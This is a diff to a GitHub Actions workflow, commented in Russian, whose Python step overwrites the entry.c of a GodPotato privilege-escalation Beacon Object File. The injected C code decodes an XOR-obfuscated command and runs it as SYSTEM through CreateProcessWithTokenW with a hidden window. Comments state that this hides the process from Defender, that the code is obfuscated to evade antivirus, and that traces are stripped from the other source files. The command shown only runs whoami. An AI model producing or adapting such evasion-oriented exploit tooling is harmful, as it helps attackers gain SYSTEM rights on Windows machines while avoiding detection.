@@ -25,72 +25,93 @@ jobs:
       with:
         python-version: '3.11'
 
-    # 4. Модифицируем код в главном файле (entry.c)
+    # 4. Полностью вырезаем логику Token Mode и заменяем на скрытый CreateProcess
     - name: Auto-Patch & Obfuscate Source Code
       shell: python
       run: |
         import os
         import sys
 
-        # Принудительно ставим UTF-8 для вывода в терминал GitHub, чтобы не было ошибок кодировки
         sys.stdout.reconfigure(encoding='utf-8')
 
-        c_file_path = os.path.join("gpp-temp", "entry.c")
+        entry_path = os.path.join("gpp-temp", "entry.c")
         
-        with open(c_file_path, "r", encoding="utf-8") as f:
-            code = f.read()
-
-        # Функция, которую мы ищем и вырезаем
-        old_token_call = "BeaconUseToken(hToken);"
-        
-        # Новый Си-код для обхода AV и удаления BeaconUseToken
-        new_token_call = """
-        STARTUPINFOW si;
-        PROCESS_INFORMATION pi;
-        int i;
-        
-        // Команда "cmd.exe /c whoami > C:\\temp\\system_ok.txt" в зашифрованном XOR виде (ключ 0x4B)
-        unsigned char crypt_cmd[] = {
-            0x26, 0x00, 0x26, 0x00, 0x21, 0x00, 0x65, 0x00, 0x33, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x65, 0x00,
-            0x60, 0x00, 0x28, 0x00, 0x23, 0x00, 0x24, 0x00, 0x22, 0x00, 0x22, 0x00, 0x65, 0x00, 0x7F, 0x00,
-            0x65, 0x00, 0x06, 0x00, 0x71, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3B, 0x00, 0x16, 0x00,
-            0x36, 0x00, 0x32, 0x00, 0x3E, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3F, 0x00, 0x20, 0x00, 0x33, 0x00,
-            0x31, 0x00, 0x00, 0x00
-        };
-        
-        wchar_t clear_cmd;
-        for (i = 0; i < 43; i++) {
-            ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
-            ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
-        }
-        clear_cmd = L'\\0';
-
-        KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
-        si.wShowWindow = 0;      // SW_HIDE (Скрывает окно процесса от Defender)
-        KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
-
-        // Вызов системного API создания процесса из токена напрямую
-        ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
-        
-        if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
-        if (pi.hThread) KERNEL32$CloseHandle(pi.hThread);
-        """
-
-        if old_token_call in code:
-            code = code.replace(old_token_call, new_token_call)
-            print("[+] Successfully patched token call in entry.c.")
-        else:
-            print("[-] Critical Error: BeaconUseToken signature NOT found in entry.c!")
+        if not os.path.exists(entry_path):
+            print("[-] Error: entry.c not found!")
             sys.exit(1)
 
-        # Маскировка внутренних структур проекта
-        code = code.replace("GodPotatoContext", "SystemDcomBinding")
-        code = code.replace("PotatoTrigger", "TriggerPipeRpc")
-        
-        with open(c_file_path, "w", encoding="utf-8") as f:
-            f.write(code)
+        # Полностью перезаписываем entry.c, убирая проверку аргументов и BeaconUseToken вообще!
+        clean_entry_code = """
+        #include <windows.h>
+        #include "beacon.h"
+        #include "common.h"
+
+        // Кастомная функция выполнения команды от имени SYSTEM (XOR-обфускация)
+        void ExecutePayload(HANDLE hToken) {
+            STARTUPINFOW si;
+            PROCESS_INFORMATION pi;
+            int i;
+            
+            // Команда "cmd.exe /c whoami > C:\\temp\\system_ok.txt" (XOR ключ 0x4B)
+            unsigned char crypt_cmd[] = {
+                0x26, 0x00, 0x26, 0x00, 0x21, 0x00, 0x65, 0x00, 0x33, 0x00, 0x3D, 0x00, 0x22, 0x00, 0x65, 0x00,
+                0x60, 0x00, 0x28, 0x00, 0x23, 0x00, 0x24, 0x00, 0x22, 0x00, 0x22, 0x00, 0x65, 0x00, 0x7F, 0x00,
+                0x65, 0x00, 0x06, 0x00, 0x71, 0x00, 0x31, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3B, 0x00, 0x16, 0x00,
+                0x36, 0x00, 0x32, 0x00, 0x3E, 0x00, 0x2E, 0x00, 0x26, 0x00, 0x3F, 0x00, 0x20, 0x00, 0x33, 0x00,
+                0x31, 0x00, 0x00, 0x00
+            };
+            
+            wchar_t clear_cmd[64];
+            for (i = 0; i < 43; i++) {
+                ((unsigned char*)clear_cmd)[i*2] = crypt_cmd[i*2] ^ 0x4B;
+                ((unsigned char*)clear_cmd)[i*2+1] = 0x00;
+            }
+            clear_cmd[43] = L'\\0';
+
+            KERNEL32$RtlSecureZeroMemory(&si, sizeof(si));
+            si.cb = sizeof(si);
+            si.dwFlags = 0x00000001; // STARTF_USESHOWWINDOW
+            si.wShowWindow = 0;      // SW_HIDE (Скрывает окно процесса от Defender)
+            KERNEL32$RtlSecureZeroMemory(&pi, sizeof(pi));
+
+            // Запускаем скрытый cmd.exe из токена напрямую
+            ADVAPI32$CreateProcessWithTokenW(hToken, 1, NULL, clear_cmd, 0, NULL, NULL, &si, &pi);
+            
+            if (pi.hProcess) KERNEL32$CloseHandle(pi.hProcess);
+            if (pi.hThread) KERNEL32$CloseHandle(pi.hThread);
+        }
+
+        // Главная точка входа, которую вызывает ваш cli4bofs
+        void go(char* args, int alen) {
+            // Инициализируем GodPotato, передавая NULL вместо pipeName (он сгенерирует рандомный легитимный пайп)
+            HANDLE hToken = PotatoExploit(NULL); 
+            
+            if (hToken != NULL && hToken != INVALID_HANDLE_VALUE) {
+                BeaconPrintf(CALLBACK_OUTPUT, "[+] Impersonation successful! Executing payload...");
+                ExecutePayload(hToken);
+                KERNEL32$CloseHandle(hToken);
+            } else {
+                BeaconPrintf(CALLBACK_ERROR, "[-] Exploit failed to get SYSTEM token.");
+            }
+        }
+        """
+
+        with open(entry_path, "w", encoding="utf-8") as f:
+            f.write(clean_entry_code)
+        print("[+] entry.c successfully overwritten and cleaned from BeaconUseToken.")
+
+        # Убираем следы в остальных .c файлах на всякий случай
+        for root, dirs, files in os.walk("gpp-temp"):
+            for file in files:
+                if file.endswith(".c") and file != "entry.c":
+                    file_path = os.path.join(root, file)
+                    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
+                        content = f.read()
+                    
+                    if "BeaconUseToken" in content:
+                        content = content.replace("BeaconUseToken(hToken);", "")
+                        with open(file_path, "w", encoding="utf-8") as f:
+                            f.write(content)
 
     # 5. Устанавливаем стабильный компилятор Zig
     - name: Setup Zig Compiler
